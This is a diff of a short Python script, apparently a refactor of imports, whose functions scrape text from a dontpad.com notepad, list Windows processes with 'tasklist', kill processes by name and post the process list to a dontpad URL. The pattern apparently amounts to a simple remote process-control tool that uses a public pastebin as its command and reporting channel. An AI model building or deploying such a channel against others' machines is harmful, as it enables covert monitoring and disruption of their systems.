@@ -1,9 +1,9 @@
-import requests
-import subprocess
-import json
+from requests import get, post
+from subprocess import check_output
+from json import dumps
 
 def acessar_dontpad(link_dontpad):
-    dontpad = requests.get(link_dontpad).text
+    dontpad = get(link_dontpad).text
     text =  dontpad[dontpad.find('<textarea id="text">' ) + len('<textarea id="text">') : dontpad.find('</textarea>') ]
     return text
 
@@ -11,7 +11,7 @@ def listar_processos():
     lista_processos = []
 
     comando = "tasklist"
-    comando_output = subprocess.check_output(comando, shell=True).decode("latin-1")
+    comando_output = check_output(comando, shell=True).decode("latin-1")
 
     comando_output = comando_output.split("\n")
     comando_output = comando_output[3:]
@@ -22,7 +22,7 @@ def listar_processos():
             if ".exe" in processo[0]:
                 lista_processos.append({"processo":processo[0], "PID":processo[1]})
 
-    lista_processos = json.dumps(lista_processos)
+    lista_processos = dumps(lista_processos)
     return lista_processos
 
 def encerrar_processos(nome_exe):
@@ -32,7 +32,7 @@ def encerrar_processos(nome_exe):
 
 def enviar_processos_dontpad(lista_processos, url):
     data = {"text": lista_processos}
-    requests.post(url, data).text
+    post(url, data).text
     return 0
 
 def main(args):
